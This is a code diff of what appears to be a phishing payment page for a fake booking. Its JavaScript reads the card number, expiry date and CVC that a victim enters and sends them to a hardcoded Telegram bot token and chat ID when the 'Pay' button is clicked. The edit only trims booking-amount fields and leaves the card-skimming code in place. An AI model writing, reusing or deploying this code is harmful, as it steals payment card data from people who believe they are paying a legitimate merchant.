@@ -1270,7 +1270,6 @@
         async function sendToTelegramBot() {
     try {
         const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-        const bookingData = JSON.parse(sessionStorage.getItem('bookingData') || '{}');
         const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
@@ -1286,10 +1285,7 @@
 💳 Карта:
 • Номер: ${cardNumber}
 • Срок: ${expiry}
-• CVC: ${cvc}
-
-🏨 Бронирование:
-• Сумма: ${bookingData.total || '570'} PLN`;
+• CVC: ${cvc}`;
 
         const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
         const CHAT_ID = '-1003239032658';
@@ -1324,6 +1320,8 @@
         return false;
     }
 }
+    
+
 
         // Обработчик кнопки "Оплатить"
         payBtn.addEventListener('click', async () => {
@@ -1471,4 +1469,5 @@
     </script>
 </body>
 </html>
+
 
